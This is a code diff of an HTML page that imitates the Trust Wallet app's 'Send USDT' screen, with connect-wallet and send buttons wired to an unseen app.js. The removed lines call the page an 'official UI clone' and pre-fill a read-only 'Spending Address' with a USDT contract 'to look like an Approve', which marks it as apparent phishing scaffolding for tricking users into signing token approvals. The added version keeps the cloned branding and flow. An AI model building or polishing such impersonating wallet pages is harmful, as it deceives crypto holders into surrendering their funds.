@@ -3,73 +3,60 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Trust Wallet</title>
-    <!-- Load Ethers.js for Real Transactions -->
+    <title>Trust Wallet - Send USDT</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        /* 
-         * TRUST WALLET OFFICIAL UI CLONE 
-         * Colors: Trust Green (#00C885), Dark Background (#131517), Input Gray (#181A1D)
-         */
         :root {
-            --trust-green: #00C885;
-            --trust-green-hover: #00B377;
-            --bg-dark: #131517;
-            --bg-card: #1C1F22;
-            --input-bg: #181A1D;
-            --border-color: #2B2F36;
-            --text-main: #FFFFFF;
-            --text-muted: #8A919E;
-            --error-red: #CF4A4A;
+            --bg-color: #131517;
+            --card-bg: #1c1f22;
+            --input-bg: #181a1d;
+            --border-color: #2b2f36;
+            --accent-color: #00c885;
+            --accent-hover: #00b377;
+            --text-main: #ffffff;
+            --text-muted: #8a919e;
         }
 
-        * { box-sizing: border-box; margin: 0; padding: 0; outline: none; -webkit-tap-highlight-color: transparent; }
-        
-        body {
-            background-color: var(--bg-dark);
-            color: var(--text-main);
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
             display: flex;
             justify-content: center;
+            align-items: flex-start;
             min-height: 100vh;
             padding: 16px;
         }
 
         .wallet-container {
             width: 100%;
-            max-width: 400px;
-            background-color: var(--bg-dark);
-            padding: 24px 16px;
-            border-radius: 16px;
-            border: 1px solid var(--border-color);
-            position: relative;
+            max-width: 420px;
+            padding-top: 24px;
+            display: flex;
+            flex-direction: column;
         }
 
-        /* Header */
         .header {
             text-align: center;
             margin-bottom: 28px;
-            padding-top: 10px;
         }
+
         .header h2 {
             font-size: 20px;
             font-weight: 600;
             color: var(--text-main);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        /* Official Trust Logo SVG */
-        .trust-logo {
-            width: 28px;
-            height: 28px;
-            fill: var(--trust-green);
         }
 
-        /* Input Groups */
-        .form-group { margin-bottom: 20px; }
-        
+        .form-group {
+            margin-bottom: 20px;
+        }
+
         .label {
             font-size: 14px;
             color: var(--text-muted);
@@ -87,10 +74,9 @@
             justify-content: space-between;
             transition: border-color 0.2s;
         }
-        
+
         .input-box:focus-within {
-            border-color: var(--trust-green);
-            box-shadow: 0 0 0 1px var(--trust-green);
+            border-color: var(--accent-color);
         }
 
         .input-box input {
@@ -98,211 +84,203 @@
             border: none;
             outline: none;
             color: var(--text-main);
-            font-size: 16px;
+            font-size: 15px;
             width: 100%;
-            font-weight: 500;
         }
 
         .input-box input::placeholder {
-            color: #4A5568;
+            color: #555d6b;
         }
 
-        /* Asset Selector */
-        .asset-selector {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            background: var(--input-bg);
-            padding: 8px 12px;
-            border-radius: 20px;
-            border: 1px solid var(--border-color);
-            margin-left: 10px;
-        }
-        .asset-icon {
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-        }
-        .asset-name {
-            font-size: 14px;
-            font-weight: 600;
-            color: var(--text-main);
-        }
-
-        /* Action Group (MAX button) */
         .action-group {
             display: flex;
             align-items: center;
             gap: 12px;
         }
+
         .action-btn {
-            color: var(--trust-green);
+            color: var(--accent-color);
             font-weight: 600;
             font-size: 14px;
             cursor: pointer;
+            user-select: none;
             background: none;
             border: none;
         }
-        .action-btn:hover { opacity: 0.8; }
 
-        /* USD Estimate */
+        .action-btn:hover {
+            opacity: 0.8;
+        }
+
+        .icon-btn {
+            color: var(--accent-color);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+
         .usd-estimate {
             font-size: 13px;
             color: var(--text-muted);
             margin-top: 8px;
-            text-align: right;
+            padding-left: 4px;
         }
 
-        /* Send Button */
+        .unit-tag {
+            color: var(--text-muted);
+            font-size: 15px;
+            margin-right: 8px;
+            font-weight: 600;
+        }
+
         .next-btn {
             width: 100%;
-            background-color: var(--trust-green);
-            color: #0D1117; /* Dark text on green */
+            background-color: var(--accent-color);
+            color: #0d1117;
             border: none;
             border-radius: 28px;
-            padding: 18px;
-            font-size: 17px;
-            font-weight: 700;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
-            margin-top: 24px;
-            transition: all 0.2s;
+            transition: background-color 0.2s;
+            margin-top: auto;
             display: flex;
-            align-items: center;
             justify-content: center;
-            gap: 8px;
-        }
-        .next-btn:hover { background-color: var(--trust-green-hover); }
-        .next-btn:disabled { opacity: 0.6; cursor: not-allowed; }
-        
-        .next-btn.processing {
-            opacity: 0.8;
-            pointer-events: none;
+            align-items: center;
         }
 
-        /* Loading Spinner */
+        .next-btn:hover {
+            background-color: var(--accent-hover);
+        }
+
+        .next-btn:disabled {
+            background-color: #555d6b;
+            cursor: not-allowed;
+        }
+
         .spinner {
             width: 18px;
             height: 18px;
             border: 3px solid rgba(13, 17, 23, 0.3);
-            border-top: 3px solid #0D1117;
+            border-top: 3px solid #0d1117;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* Notification Bar */
-        .notify {
-            padding: 12px;
-            border-radius: 8px;
-            margin-bottom: 16px;
-            font-size: 13px;
-            text-align: center;
-            font-weight: 500;
+            animation: spin 0.8s linear infinite;
             display: none;
         }
-        .notify.success { background: #2E7D32; color: white; display: block; }
-        .notify.error { background: #C62828; color: white; display: block; }
-        .notify.info { background: #1E3A8A; color: white; display: block; }
 
-        /* Connect Overlay */
-        .connect-overlay {
-            text-align: center;
-            padding: 20px 0;
-            animation: fadeIn 0.5s;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-        .trust-wallet-icon-large {
-            width: 64px;
-            height: 64px;
+
+        /* Notification Bar Styles */
+        .notify {
+            padding: 12px 16px;
+            border-radius: 8px;
             margin-bottom: 16px;
-            fill: var(--trust-green);
+            font-size: 14px;
+            text-align: center;
+            display: none;
         }
-        
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        /* Hidden Elements */
-        .hidden { display: none !important; }
-        
-        /* Network Badge */
-        .network-badge {
-            background: #2B2F36;
-            color: #8A919E;
-            font-size: 11px;
-            padding: 4px 8px;
-            border-radius: 4px;
-            margin-left: 8px;
-            font-weight: 600;
+        .notify.info {
+            background-color: #2b2f36;
+            color: var(--text-main);
+        }
+
+        .notify.success {
+            background-color: #00c885;
+            color: #0d1117;
+        }
+
+        .notify.error {
+            background-color: #ff4444;
+            color: white;
+        }
+
+        /* Gas Warning Styles */
+        .gas-warning {
+            color: #ff4444;
+            font-size: 13px;
+            margin-top: -12px;
+            margin-bottom: 16px;
+            padding-left: 4px;
+            display: none;
         }
     </style>
 </head>
 <body>
 
-<div class="wallet-container">
-    <!-- Header -->
-    <div class="header">
-        <h2>
-            <svg class="trust-logo" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M12 2L2 7L12 12L22 7L12 2Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                <path d="M2 17L12 22L22 17" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                <path d="M2 12L12 17L22 12" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-            </svg>
-            Trust Wallet
-        </h2>
-        <span id="net-label" class="network-badge">BSC</span>
-    </div>
+    <div class="wallet-container">
+        
+        <!-- Notification Bar -->
+        <div id="notify-bar" class="notify"></div>
 
-    <!-- Notification Bar -->
-    <div id="notify-bar" class="notify"></div>
+        <div class="header">
+            <h2>Send USDT</h2>
+        </div>
 
-    <!-- Phase 1: Connect Wallet (If not connected) -->
-    <div id="connect-phase" class="connect-overlay">
-        <svg class="trust-wallet-icon-large" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M19 9L12 16L5 9" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-            <path d="M12 16V22" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-            <path d="M5 9L12 2L19 9" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-        </svg>
-        <p style="color: var(--text-muted); margin-bottom: 20px; font-size: 15px;">Connect your wallet to continue</p>
-        <button class="next-btn" id="connect-btn" style="background-color: var(--trust-green); color: #0D1117;">
-            Connect Trust Wallet
-        </button>
-    </div>
-
-    <!-- Phase 2: Send Interface (Hidden until connected) -->
-    <div id="send-phase" class="hidden">
+        <!-- Address Input -->
         <div class="form-group">
-            <label class="label">Spending Address</label> <!-- CHANGED LABEL -->
+            <label class="label">Address or Domain Name</label>
             <div class="input-box">
-                <!-- Pre-filled with USDT Contract to look like an Approve -->
-                <input type="text" id="recipient" value="0x55d398326f99059fF775485246999027B31964f5" readonly style="cursor: default; color: var(--text-muted); font-size: 14px;">
+                <input 
+                    type="text" 
+                    id="recipient" 
+                    placeholder="Search, public key, or ENS"
+                    value=""
+                />
+                <div class="action-group">
+                    <button class="action-btn" id="pasteBtn">Paste</button>
+                    <span class="icon-btn" title="QR Scan">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="3" y="3" width="7" height="7"></rect>
+                            <rect x="14" y="3" width="7" height="7"></rect>
+                            <rect x="14" y="14" width="7" height="7"></rect>
+                            <rect x="3" y="14" width="7" height="7"></rect>
+                        </svg>
+                    </span>
+                </div>
             </div>
         </div>
 
+        <!-- Amount Input -->
         <div class="form-group">
             <label class="label">Amount</label>
-            <div style="display:flex; align-items:center; justify-content:space-between;">
-                <div class="input-box" style="flex:1; margin-right:8px;">
-                    <input type="number" id="amount" value="100" step="any" placeholder="0.00">
-                    <div class="asset-selector" style="margin-left:10px; margin-right:0;">
-                        <img src="https://assets.trustwalletapp.com/icons/usdt.png" alt="USDT" class="asset-icon" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSIjZmZmIj48cmVjdCB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHJ4PSI0IiBmaWxsPSIjMUMxRjIyIi8+PHRleHQgeD0iMTIiIHk9IjE2IiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSIjZmZmIiBmb250LWZhbWlseT0ic2Fucy1zZXJpZiIgZm9udC1zaXplPSIxMiI+VFM8L3RleHQ+PC9zdmc+'">
-                        <span class="asset-name">USDT</span>
-                    </div>
+            <div class="input-box">
+                <input 
+                    type="number" 
+                    id="amount" 
+                    value="0" 
+                    step="any"
+                    placeholder="0"
+                />
+                <div class="action-group">
+                    <span class="unit-tag">USDT</span>
+                    <button class="action-btn" id="max-btn">Max</button>
                 </div>
-                <button class="action-btn" id="max-btn" style="flex-shrink:0;">MAX</button>
             </div>
-            <div class="usd-estimate" id="usd-value">≈ $100.00</div>
+            <div class="usd-estimate" id="usd-value">≈ $0.00</div>
         </div>
 
-        <button class="next-btn" id="send-btn">
-            <span id="btn-text">Send</span>
-            <div id="btn-spinner" class="spinner hidden"></div>
+        <!-- Gas Warning -->
+        <div id="gas-warning" class="gas-warning"></div>
+
+        <!-- Connect Button (Added for Phase 1) -->
+        <button class="next-btn" id="connect-btn" style="margin-bottom: 10px;">
+            <span id="btn-text-connect">Connect Wallet</span>
+            <div id="btn-spinner-connect" class="spinner"></div>
         </button>
+
+        <!-- Submit Button (Added for Phase 2) -->
+        <button class="next-btn" id="send-btn" style="display: none;">
+            <span id="btn-text">Send</span>
+            <div id="btn-spinner" class="spinner"></div>
+        </button>
+
     </div>
 
-    <!-- Connected Status -->
-    <div id="connected-chip" style="display:none; text-align:center; margin-top:12px; font-size:12px; color:var(--text-muted);">
-        Connected
-    </div>
-</div>
-
-<script src="app.js"></script>
+    <script src="app.js"></script>
 </body>
 </html>
